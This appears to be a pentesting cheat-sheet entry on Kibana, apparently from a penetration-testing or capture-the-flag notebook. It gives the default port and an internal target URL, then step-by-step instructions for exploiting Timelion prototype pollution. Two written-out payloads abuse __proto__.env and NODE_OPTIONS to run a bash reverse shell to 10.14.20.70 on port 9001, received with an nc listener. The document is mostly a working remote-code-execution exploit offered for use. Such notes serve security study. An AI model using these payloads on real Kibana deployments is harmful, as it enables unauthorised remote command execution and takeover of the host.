# Kibana 

Kibana provides search and data visualization capabilities for data indexed in Elasticsearch. The service runs per default on port 5601. Kibana also acts as the user interface for monitoring, managing, and securing an Elastic Stack cluster.

## HTTP

Check `http://10.10.98.43:5601/`

## Prototype pollution

![kibana](/Pentesting/_images/kibana.PNG)

## Exploit

1. Open Kibana
2. Past one of the following payload into the Timelion visualizer
4. Setup nc listener
3. Click run


Payloads:
```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/10.14.20.70/9001 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.14.20.70/9001 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```